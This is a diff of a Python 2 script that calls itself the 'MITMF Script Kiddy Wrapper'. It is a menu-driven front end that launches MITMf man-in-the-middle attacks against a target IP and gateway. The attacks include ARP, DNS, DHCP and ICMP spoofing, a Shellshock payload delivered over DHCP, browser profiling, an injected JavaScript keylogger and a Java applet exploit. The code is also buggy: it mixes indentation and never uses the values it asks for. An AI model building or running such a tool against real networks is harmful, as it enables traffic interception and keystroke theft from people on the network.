@@ -11,129 +11,165 @@ firstHalf=""
 lastHalf=""
 
 def GetGateway():
-	gateway= raw_input("\nPlease Enter Targets Gateway or Router:")
-	return gateway
+    gateway= raw_input("\nPlease Enter Targets Gateway or Router:")
+    return gateway
     
 def GetInterface():
-    WrtieIntro()
-	print "-----------------------------------------"
+	WrtieIntro()
+	WriteMainMenu()
+	print"-----------------------------------------"
 	os.system("ip link show")
-	print "-----------------------------------------"
+	print("-----------------------------------------")
 	interface= raw_input("\nPlease Enter Interface:")
-	return interface
-    
+	return interface 
+
 def GetIP():
-	ip= raw_input("\nPlease Enter Targets IP:")
-	try:
-    	socket.inet_aton(ip)
-	except socket.error:
-    	print("Thats not a valid IP slick!")
-    	GetIP()
-	os.system("clear")
-	return ip
+    ip= raw_input("\nPlease Enter Targets IP (dont forget the cider notation ie./24):")
+    return ip
  
 def WriteMainMenu():
-	os.system("clear")
-	print"	___________________________________________"
-	print"	|         	***MAIN MENU***         	|"
-	print"	|                                     	|"
-	print"	|NOTE:Here is how its gonna work. You give|"
-	print"	|me the target IP, Gateway, and what you  |"
-	print"	|want to do and ill do the rest. If you   |"
-	print"	|put something in wrong just restart. 	|"
-	print"	|_________________________________________|"
-	return
+    os.system("clear")
+    print"    ___________________________________________"
+    print"    |             ***MAIN MENU***             |"
+    print"    |                                         |"
+    print"    |NOTE:Here is how its gonna work. You give|"
+    print"    |me the target IP, Gateway, and what you  |"
+    print"    |want to do and ill do the rest. If you   |"
+    print"    |put something in wrong just restart.     |"
+    print"    |_________________________________________|"
 
 def WrtieIntro():    
-	os.system("clear")
-	print "-----------------------------------------------"
-	print "***Welcome to the MITMF Script Kiddy Wrapper***"
-	print "-----------------------------------------------"
+    os.system("clear")
+    print "-------------------------------------------------"
+    print "***  Welcome to the MITMF Script Kiddy Wrapper  ***"
+    print "-------------------------------------------------"
     
 def FigureOutHowToAttack():
-    os.system("clear")
-    print"___________________________________________________________________"
-    print"|          	SELECT WHAT KIND OF OPTIONS TO RUN:            	|"
-    print"|-----------------------------------------------------------------|"
-    print"|1. Run PreBuilt Attack from a menu selection.                	|"
-    print"|2. Build your own attack by selecting the options form a menu.\n |"
-    print"|_________________________________________________________________|"
-    
-    try:
-   	 WhatToRun=raw_input("What attack package would you like to run:")
-   	 if WhatToRun == '1':
-   		 MainAttackMenu()
-   	 elif WhatToRun == '2':
-   		 ShowAdditionalMenu()
-   	 else:
-   		 print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
-   		 FigureOutHowToAttack()
-    except:
-   	 print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
-   	 FigureOutHowToAttack()    
-
-    return 0
-    
-def WriteMenuOptions():
 	os.system("clear")
-	print"	_________________________________________"
-	print"	|       	MAIN ATTACK OPTIONS     	|"
-	print"	|_______________________________________|"
-	print"	|1. Arp-Spoof   	2. Arp-Reply-Spoof  |"
-	print"	|3. Browser-Profile 4. DHCP-ShellShock  |"
-	print"	|5. ICMP-Spoof  	6.Arp w/Keylogger   |"
-	print"	|_______________________________________|"
-	return
+	print"___________________________________________________________________"
+	print"|              SELECT WHAT KIND OF OPTIONS TO RUN:                |"
+	print"|-----------------------------------------------------------------|"
+	print"|1. Run prebuilt attack from a menu selection.                    |"
+	print"|2. Build your own attack by selecting the options form a menu.   |"
+	print"|_________________________________________________________________|"
+	
+	try:
+		WhatToRun=raw_input("Select the menu number for how you want to conduct your attack:")
+		if WhatToRun == '1':
+			MainAttackMenu()
+		elif WhatToRun == '2':
+			CustomeMenuAttackStringBUild()
+		else:
+			print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
+			FigureOutHowToAttack()
+	except:
+		print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
+		FigureOutHowToAttack()	
+	
+def WriteMenuOptions():
+    os.system("clear")
+    print"    _________________________________________"
+    print"    |           MAIN ATTACK OPTIONS         |"
+    print"    |_______________________________________|"
+    print"    |1. Arp-Spoof       2. Spoof            |"
+    print"    |3. Browser-Profile 4. DHCP-ShellShock  |"
+    print"    |5. ICMP-Spoof      6. Arp w/Keylogger  |"
+    print"    |_______________________________________|"
 
 def MainAttackMenu():
-    while True:
-   	 WriteMenuOptions()
-   	 menuOption=raw_input("Please type your selection:")
-   	 
-   	 if menuOption=="1":
-   		 os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip+"/24")
-   		 break
-   	 elif menuOption=="2":
-   		 os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+"/24 --mode rep")
-   		 break
-   	 elif menuOption=="3":
-   		 os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+"/24 --browserprofiler")
-   		 break
-   	 elif menuOption=="4":
-   		 os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock \'echo Pwn3d\'")
-   		 break
-   	 elif menuOption=="5":
-   		 os.system("mitmf -i "+interface+" --spoof --icmp --gateway "+gateway+" --target "+ip)
-   		 break
-   	 elif menuOption=="6":
-   		 os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip+" --jskeylogger")
-   		 break
-   	 else:
-   		 whileLoopBool=False
-   		 os.system("clear")
-   		 print"\nInvalid Selection slick, Try again, and get it right this time!!!\n"
-
-   	 print "STARTING PROGRAM HAPPY PEN-TESTING :D \n\n"
-   	 
-#THIS def functionallity is not fully working yet!!!!!!!!!!   	 
-def ShowAdditionalMenu():
-    os.system("clear")
-    print"	_________________________________________"
-    print"	|    	Sub-Menu ATTACK OPTIONS    	|"
-    print"	|_______________________________________|"
-    print"	|1. Arp         	2. DNS          	|"
-    print"	|3. Spoof       	4. DHCP         	|"
-    print"	|5. ICMP                            	|"
-    print"	|_______________________________________|"
-    print"	|6. ShellShock Payload   7. Keylogger   |"
-    print"	|8. Browser Profiler 	9. Java Applet |"
-    print"	|10. Jsvsscript Inject   11. HTML Inject|"
-    print"	|_______________________________________|"
-    print"	|  	----PRESS 99 to exit---      	|"
-    print"	|_______________________________________|"
-    MenuSelection=raw_input("Please Type Your Selection")
-    return
+	while True:
+		WriteMenuOptions()
+		menuOption=raw_input("Please type your selection:")
+		
+		if menuOption=="1":
+			os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip)
+			break
+		elif menuOption=="2":
+			os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --mode rep")
+			break
+		elif menuOption=="3":
+			os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --browserprofiler")
+			break
+		elif menuOption=="4":
+			os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock \'echo Pwn3d\'")
+			break
+		elif menuOption=="5":
+			os.system("mitmf -i "+interface+" --spoof --icmp --gateway "+gateway+" --target "+ip)
+			break
+		elif menuOption=="6":
+			os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip+" --jskeylogger")
+			break
+		else:
+			whileLoopBool=False
+			os.system("clear")
+			print"\nInvalid Selection slick, Try again, and get it right this time!!!\n" 
     
+def ShowCustomeBuildMenu():
+	os.system("clear")
+	print"    _________________________________________"
+	print"    |       CUSTOM BUILD ATTACK OPTIONS     |"
+	print"    |_______________________________________|"
+	print"    |1. Arp             2. DNS              |"
+	print"    |3. Spoof           4. DHCP             |"
+	print"    |5. ICMP                                |"
+	print"    |_______________________________________|"
+	print"    |6. ShellShock Payload   7.  Keylogger  |"
+	print"    |8. Browser Profiler     9.  Java Applet|"
+   #print"    |10.Javascript Inject    11. HTML Inject|"
+	print"    |_______________________________________|"
+	print"    |      ----PRESS 'q' to exit---         |"
+	print"    |_______________________________________|"
+
+def CustomeMenuAttackStringBUild():	
+	#options 1-5 = var firstHalf
+	#6-11 =var lastHalf
+	#BASE STATEMENT os.system("mitmf -i "+interface + " "+ firstHalf + " "+ gateway + " --target "+ip+ " "+lastHalf)
+	ShowCustomeBuildMenu()
+	count=0
+	while (count <20):
+		MenuSelection=raw_input("Please type your selection (type q when done):")
+		if MenuSelection == '1':
+			firstHalf +=" --arp"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '2':
+			firstHalf +=" --dns"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '3':
+			firstHalf +=" --spoof"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '4':
+			firstHalf +=" --dhcp"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '5':
+			firstHalf +=" --icmp"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '6':
+			lastHalf +=" --shellshock"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '7':
+			lastHalf +=" --jskeylogger"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '8':
+			lastHalf +=" --browserprofiler"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == '9':
+			lastHalf +=" --javapwn"
+			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		elif MenuSelection == 'q': 
+			break
+		else:
+			print"What tha **** did you just enter?!"
+		count=count+1		
+	if len(firstHalf)==0 and len(lastHalf)==0:
+		os.system("clear")
+		print "Incomplete command. Retry..."
+		CustomeMenuAttackStringBUild()
+	else:
+		os.system("mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
+		
+	
+
+#MAIN PROGRAM IS BELOW	
 WrtieIntro()
 WriteMainMenu()
 os.system("ip addr")
@@ -141,9 +177,8 @@ GetIP()
 GetGateway()
 GetInterface()
 FigureOutHowToAttack()
-
+print "STARTING PROGRAM HAPPY PEN-TESTING :D \n\n" 
     
-
 
 
 
